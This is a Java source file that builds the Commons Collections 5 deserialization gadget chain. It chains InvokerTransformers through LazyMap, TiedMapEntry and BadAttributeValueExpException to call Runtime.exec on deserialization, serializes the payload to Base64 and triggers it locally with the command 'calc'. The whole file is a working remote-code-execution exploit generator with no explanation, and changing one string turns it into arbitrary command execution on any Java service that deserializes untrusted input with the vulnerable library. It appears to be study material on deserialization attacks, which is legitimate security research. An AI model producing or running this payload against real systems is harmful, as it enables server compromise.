package exp;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.util.HashMap;
import java.util.Map;

import static tools.Decode.unserializeBase64Decode;
import static tools.Encode.serializeBase64Encode;
import static tools.SetField.setField;

public class CC5 {
    public static void main(String[] args) throws Exception{
        String command = "calc";
        Transformer[] transformers =  new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class}, new Object[]{command})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        Map lazyMap = LazyMap.decorate(map,chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"key");
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        setField(badAttributeValueExpException,"val",tiedMapEntry);
        serializeBase64Encode(badAttributeValueExpException);
        unserializeBase64Decode("ser.bin");
    }
}
